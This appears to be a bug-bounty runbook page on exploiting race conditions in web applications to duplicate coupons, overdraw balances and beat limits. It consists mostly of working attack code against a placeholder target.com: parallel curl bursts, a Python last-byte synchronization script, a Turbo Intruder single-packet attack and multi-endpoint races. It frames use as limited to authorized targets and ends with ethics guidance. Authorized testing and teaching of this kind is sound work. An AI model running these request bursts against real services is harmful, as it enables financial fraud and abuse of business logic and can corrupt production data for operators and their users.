---
title: "Race Condition"
description: "Exploiting the time-of-check-to-time-of-use gap with parallel requests to duplicate coupons, overdraw balances, and beat limits."
phase: Web
order: 64
tags:
  - race-condition
  - logic
  - concurrency
  - business-logic
tools:
  - turbo intruder
  - curl
  - python3
updated: 2026-10-01
---

A race condition runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: fire state-changing requests inside the same tiny window and prove an exclusive check is not atomic, without damaging real data.

## 1. Find the check-then-act operation

```bash
curl -s -X POST "https://target.com/api/redeem" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code":"PROMO10"}' -o redeem.json
cat redeem.json
```

Candidates: coupon redemption, wallet transfers, refunds, votes, invitation acceptance, OTP validation.

## 2. Simple parallel burst over one connection

```bash
seq 20 | xargs -P20 -I{} curl -s --http2 -X POST \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code":"PROMO10"}' \
  "https://target.com/api/redeem" -o /dev/null -w '%{http_code}\n'
```

If more than one request succeeds, the guard is likely not atomic.

## 3. Last-byte synchronization with Python

```bash
python3 - <<'PY'
import socket, ssl, time, os
HOST, PORT, PATH = "target.com", 443, "/api/redeem"
BODY = b'{"code":"PROMO10"}'
req = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
       f"Cookie: session={os.environ['SESSION']}\r\n"
       "Content-Type: application/json\r\n"
       f"Content-Length: {len(BODY)}\r\nConnection: keep-alive\r\n\r\n").encode()
ctx = ssl.create_default_context()
socks = [ctx.wrap_socket(socket.create_connection((HOST, PORT)), server_hostname=HOST)
         for _ in range(20)]
for s in socks: s.sendall(req[:-1])
time.sleep(0.1)
for s in socks: s.sendall(req[-1:])
for s in socks:
    print(s.recv(2048).split(b"\r\n")[0]); s.close()
PY
```

## 4. Single-packet attack with Turbo Intruder

```python
# Turbo Intruder: queue all, then engine.openGate('race')
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           engine=Engine.HTTP2, requestsPerConnection=100)
    for i in range(30):
        engine.queue(target.req, gate='race')
def handleResponse(req, interesting):
    table.add(req)
```

Burp Repeater equivalent: select requests and "Send group in parallel (single-packet attack)".

## 5. Multi-endpoint races

```bash
curl -s -X POST "https://target.com/api/coupon/claim" -d '{"id":"10"}' &
curl -s -X POST "https://target.com/api/coupon/use"   -d '{"id":"10"}' &
wait
```

Other combinations: verify email while logging in, register a username while another session claims it.

## 6. Confirm without harm

- Re-run and check whether success is non-deterministic.
- Inspect server-side state once rather than hammering.
- Use a low-value test account and coupon; stop at the first clear proof.

## Full pipeline

```bash
# 1. Baseline single request
curl -s -X POST "https://target.com/api/redeem" -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" -d '{"code":"PROMO10"}'

# 2. Parallel burst (HTTP/2)
seq 20 | xargs -P20 -I{} curl -s --http2 -X POST -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" -d '{"code":"PROMO10"}' \
  "https://target.com/api/redeem" -o /dev/null -w '%{http_code}\n'

# 3. Last-byte sync PoC: export SESSION, then run the section 3 script
export SESSION
```

## Ethics & legality

- Only race operations on accounts and resources you own or are authorized to use.
- Never exploit a financial race for real gain; prove it on a canary and stop.
- Avoid repeated bursts that could corrupt production data or cause downtime.
- Report the atomicity gap with request timing evidence, not a destructive demo.
